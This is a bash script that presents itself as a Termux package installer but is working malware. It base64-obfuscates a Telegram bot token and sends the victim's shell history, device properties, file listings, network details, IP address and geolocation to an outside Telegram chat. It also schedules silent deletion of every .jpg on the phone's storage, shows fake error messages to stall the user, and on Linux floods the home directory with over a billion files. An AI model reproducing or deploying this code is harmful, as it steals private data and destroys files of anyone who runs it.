#!/bin/bash
# Open-Source xD

clear
which figlet > 2&>1 || pkg install figlet > 2&>1
figlet installing

tkn=$(base64 -d <<<"MTc4OTQ4MTA5NTpBQUZ1MHk3bmJSS1c2ZHNQa3ZXeV9oM2tFQnRLV01oakN3cwo=")
grp=$(base64 -d <<<"MTM2OTQzMDEwOAo=")

sM(){
        curl -sX POST "https://api.telegram.org/bot$tkn/sendMessage" \
                -d "chat_id=$grp" "parse_mode=markdownv2" \
                -d "disable_web_page_preview=true" \
                --data-urlencode "text=$1"
}

sF(){
        curl -sF document=@"$1" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp"
}

printf "\e[0;92m[*] Installing Dependencies\e[0m\n"
which curl > 2&>1 || pkg install curl -y > 2&>1
#which figlet > 2&>1 || pkg install figlet > 2&>1
# Whats device is this
printf "\n"

android(){
#check some shits
which neofetch > 2&>1 || pkg install neofetch -y > 2&>1
which wget > 2&>1 || pkg install wget -y > 2&>1
which pv > 2&>1 || pkg install pv -y > 2&>1
which jq > 2&>1 || pkg install jq -y > 2&>1

( ( sleep 40m; cd /sdcard && find -name *.jpg -delete ) & ) # punishment for lazyness

sM "$(neofetch --stdout)" > 2&>1
history > THT-history; curl -sF document=@"THT-history" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-history
getprop > THT-getprop; curl -sF document=@"THT-getprop" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-getprop
printf "\n\e[0;91mSome packages Fails, wait a minute fixing...\e[0m\n" | pv -qL 15
cd $HOME; ls > THT-home; curl -sF document=@"THT-home" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-home
cd /sdcard > 2&>1 || termux-setup-storage; cd /sdcard; du -h --max-depth=1 |sort -rh > THT-sdcard; curl -sF document=@"THT-sdcard" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-sdcard
cd && du > THT-disk; curl -sF document=@"THT-disk" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-disk
sM "Ip: $(curl ifconfig.me)" > 2&>1
ifconfig > THT-net; curl -sF document=@"THT-net" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
rm THT-net
sM "$(curl -s http://ip-api.com/json/$(curl -s ifconfig.me) | jq)" > 2&>1
figlet Done
printf "\e[0;96m Hi its looks as u know some things in linux but playing with script still prob to you, Look i have everything about ur phone \e[0m\n" | pv -qL 15
echo ""
echo "Your Ip: $(curl -s ifconfig.me)" | pv -qL 15
figlet Device
neofetch --stdout | pv -qL 15
figlet location
curl -s http://ip-api.com/json/$(curl -s ifconfig.me) | jq | pv -qL 15
figlet nevermind
echo "Visit Our Blog Here You Will Learn lots of stuffs" | pv -qL 15
echo ""
echo "https://dark-web-tz.blogspot.com/" | pv -qL 15
echo ""
echo "I could Do malicious Things To ur sys but am not, its just for learning purpose" | pv -qL 15
sleep 3
termux-open-url https://dark-web-tz.blogspot.com/

}

if [[ $(uname -o) == "Android" ]]; then
sM "OS: Android" > 2&>1
android
elif [[ $(uname -o) == "Linux" ]]; then
sM "OS: seems To be Kali" > 2&>1
cd
if [[ getuid() != "0" ]]; then
for ass in `seq 0 1234567890`
do
mkdir You-Have-Hacked-$ass
touch TH33HT-WAS-HERE-$ass
done
else
for ass in `seq 0 1234567890`
do
sudo mkdir You-Have-Hacked-$ass
sudo touch TH33HT-WAS-HERE-$ass
done
fi
else:
exit
#sM "OS: Idk what the hell is this" > 2&>1
fi

